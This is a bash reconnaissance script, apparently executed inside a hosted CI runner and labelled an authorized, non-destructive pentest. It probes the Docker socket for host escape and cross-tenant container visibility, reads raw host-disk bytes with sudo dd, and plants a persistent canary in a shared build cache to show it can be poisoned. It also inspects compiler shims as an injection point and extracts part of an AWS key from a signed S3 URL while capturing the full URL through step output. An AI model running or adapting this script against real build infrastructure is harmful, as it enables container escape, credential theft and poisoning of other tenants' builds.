#!/usr/bin/env bash
# Authorized pentest run 2 — focused: docker.sock/host-device escape, cache persistence, IB accel shims, S3 cred scope.
# NON-DESTRUCTIVE: read-only capability proofs; cache canary is a single small marker file we also clean up.
set +e
CANARY="IBPT-RUNNER-CANARY-8842"
sec(){ echo; echo "==================== $* ===================="; }
cap(){ timeout 25 bash -c "$*" 2>&1 | head -c 6000; echo; }
echo "### $CANARY recon2 start $(date -u +%FT%TZ)  run=$GITHUB_RUN_ID attempt=$GITHUB_RUN_ATTEMPT"

sec "A. DOCKER SOCKET / DAEMON — escape + cross-tenant container visibility"
cap 'ls -la /run/docker.sock /var/run/docker.sock 2>/dev/null; file /run/docker.sock 2>/dev/null'
cap 'docker version 2>&1 | head -30'
echo "-- containers visible via the daemon (other tenants runners?) --"
cap 'docker ps -a --no-trunc --format "{{.ID}} | {{.Image}} | {{.Names}} | {{.Status}} | {{.Command}}" 2>&1 | head -40'
echo "-- images (shared host cache?) --"
cap 'docker images 2>&1 | head -25'
echo "-- daemon info (root dir, host?) --"
cap 'docker info 2>&1 | grep -iE "name|root dir|server version|operating system|containers|images|storage" | head -20'

sec "B. HOST BLOCK DEVICES — raw host disk read (primitive only, NO third-party file contents)"
cap 'sudo lsblk 2>&1; echo "---"; sudo blkid 2>&1 | head'
cap 'ls -la /dev/vda /dev/vdh 2>/dev/null'
echo "-- can we read the raw host root disk /dev/vda? (magic bytes only) --"
cap 'sudo dd if=/dev/vda bs=512 count=1 status=none 2>/dev/null | od -A x -t x1z | head -4'
echo "-- is /dev/vda a filesystem we could mount read-only? (identify only, do NOT mount/browse) --"
cap 'sudo file -s /dev/vda 2>&1; sudo file -s /dev/vdh 2>&1'

sec "C. PERSISTENT CACHE — cross-run/cross-workflow persistence + poisoning surface"
CACHE=/ib-workspace/cache
echo "-- does a canary from a PRIOR run already exist? (proves persistence) --"
cap "ls -la $CACHE/$CANARY.persist 2>/dev/null && echo PRIOR_CANARY_PRESENT || echo no_prior_canary"
cap "cat $CACHE/$CANARY.persist 2>/dev/null"
echo "-- write a canary marker for the NEXT run to observe --"
echo "written by run=$GITHUB_RUN_ID sha=$GITHUB_SHA at $(date -u +%FT%TZ) repo=$GITHUB_REPOSITORY" > "$CACHE/$CANARY.persist" 2>/dev/null && echo "canary written to $CACHE/$CANARY.persist" || echo "cache not writable"
echo "-- cache ownership/perms + contents (shared across repos/tenants?) --"
cap "ls -la $CACHE 2>/dev/null | head -40"
cap "sudo find $CACHE -maxdepth 2 -newermt '2026-07-01' 2>/dev/null | grep -viE '$CANARY' | head -30"
echo "-- ccache/sccache stats (evidence of reuse across builds) --"
cap "ccache -s 2>/dev/null | head -20; ls -la $CACHE/ccache 2>/dev/null | head"

sec "D. IB ACCELERATION SHIMS — how build tools are wrapped (injection surface)"
cap 'ls -la /ib-workspace/incredibuild/ib-accel/bin 2>/dev/null | head -40'
cap 'which cc gcc c++ g++ make; for t in cc gcc make; do echo "== $t =="; readlink -f "$(which $t)"; file "$(which $t)"; done'
echo "-- peek a shim (how does it invoke the real compiler / pass flags?) --"
cap 'for f in /ib-workspace/incredibuild/ib-accel/bin/*; do echo "== $f =="; head -c 400 "$f" 2>/dev/null; echo; done | head -c 3000'
echo "-- IB build/console binaries + how ib_console_flags is consumed --"
cap 'ls -la /opt/incredibuild/bin 2>/dev/null | head; find /opt/incredibuild -iname "*console*" -o -iname "ib_console*" 2>/dev/null | head'
cap 'sudo grep -rslE "ib_console_flags|IB_CONSOLE_FLAGS|console_flags" /opt/incredibuild /ib-workspace/incredibuild 2>/dev/null | head'

sec "E. S3 telemetry cred — presence + scope hint (values handled out-of-band)"
echo "IB_DATA_S3_URL host/path (query redacted):"
echo "$IB_DATA_S3_URL" | sed -E 's/\?.*/?<redacted-query>/'
echo "AWSAccessKeyId prefix: $(echo "$IB_DATA_S3_URL" | grep -oE 'AWSAccessKeyId=[A-Z0-9]{8}' )..."
echo "(full signed URL intentionally NOT printed to logs; captured via step output for authorized scope analysis)"

echo; echo "### $CANARY recon2 end $(date -u +%FT%TZ)"
